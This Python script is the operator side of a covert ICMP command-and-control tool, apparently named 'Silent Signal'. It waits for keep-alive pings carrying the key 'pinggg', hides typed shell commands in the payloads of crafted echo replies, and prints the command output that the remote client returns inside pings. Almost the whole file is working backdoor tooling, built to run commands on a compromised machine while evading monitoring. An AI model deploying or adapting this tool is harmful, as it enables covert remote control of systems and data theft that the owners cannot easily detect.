from scapy.all import *
from subprocess import Popen, PIPE
import threading
import queue
import time

# unique key from client.py:
clientkey = "pinggg"

# Command queue for sending commands to the client
command_queue = queue.Queue()
client_ip = None  # No predefined client IP
debug = 0  # Set to 1 for debugging, 0 for no debugging
hideart = False

def handle_incoming_packets():
    global client_ip
    while True:
        packet = sniff(count=1, filter="icmp", timeout=60)
        if packet:
            src_ip = packet[0][IP].src
            if client_ip is None:
                client_ip = src_ip  # Set client IP upon receiving the first packet
                if debug:
                    print(f"Client IP set to {client_ip}")
            if ICMP in packet[0] and packet[0][ICMP].type == 8:  # Check for ICMP Echo Request
                icmp_request = packet[0][ICMP]
                if debug:
                    print(f"Received ICMP Echo Request from {src_ip}:")
                    print(f"  Type: {icmp_request.type}")
                    print(f"  Code: {icmp_request.code}")
                    print(f"  Checksum: {icmp_request.chksum}")
                    print(f"  ID: {icmp_request.id}")
                    print(f"  Sequence: {icmp_request.seq}")
                if Raw in icmp_request:
                    result = icmp_request[Raw].load.decode('utf-8', errors='ignore')
                    if debug:
                        print(f"  Data: {result}")
                    if result == clientkey:
                        if debug:
                            print(f"Received keep-alive ping from {src_ip}")
                        if not command_queue.empty():
                            target, cmd = command_queue.get()
                            if cmd == 'exit':
                                break
                            if debug:
                                print("Sending command:", cmd)
                            # ICMP Echo Reply - NEED TO ADD 1 to seq!!!
                            icmp_reply = ICMP(type=0, code=0, id=icmp_request.id, seq=icmp_request.seq + 1)
                            icmp_reply.add_payload(Raw(load=cmd.encode()))
                            reply_packet = IP(dst=src_ip, src=packet[0][IP].dst) / icmp_reply
                            if debug:
                                print("Crafted ICMP Echo Reply:")
                                print(f"  Type: {reply_packet[ICMP].type}")
                                print(f"  Code: {reply_packet[ICMP].code}")
                                print(f"  Checksum: {reply_packet[ICMP].chksum}")
                                print(f"  ID: {reply_packet[ICMP].id}")
                                print(f"  Sequence: {reply_packet[ICMP].seq}")
                                print(f"  Data: {reply_packet[Raw].load.decode('utf-8', errors='ignore')}")
                            send(reply_packet, verbose=0)
                            if debug:
                                print("Command sent")
                    elif result != "hello":
                        print(f"\nCommand execution output from {src_ip}:")
                        print(result)
        else:
            if debug:
                print("No ICMP packet received within the timeout period.")

def send_commands():
    global client_ip
    while True:
        if client_ip is None:
            if debug:
                print("Waiting for client IP...")
            time.sleep(1)
            continue
        cmd = input("Enter command to send: ")
        if cmd == 'exit':
            command_queue.put((client_ip, cmd))
            break
        command_queue.put((client_ip, cmd))
def print_ascii_art():
    ascii_art = """
    ░▒▓███████▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓████████▓▒░▒▓███████▓▒░▒▓████████▓▒░
    ░▒▓█▓▒░     ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░
    ░▒▓█▓▒░     ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░
    ░▒▓██████▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓██████▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░
          ░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░
          ░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░
    ░▒▓███████▓▒░▒▓█▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░

    ░▒▓███████▓▒░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░
    ░▒▓█▓▒░     ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░
    ░▒▓█▓▒░     ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░
    ░▒▓██████▓▒░░▒▓█▓▒░▒▓█▓▒▒▓███▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░
          ░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░
          ░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░
    ░▒▓███████▓▒░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░
    """
    print(ascii_art)
if hideart == False:
    print_ascii_art()
# Start packet handling in a separate thread
threading.Thread(target=handle_incoming_packets).start()

# Start sending commands to the client
threading.Thread(target=send_commands).start()
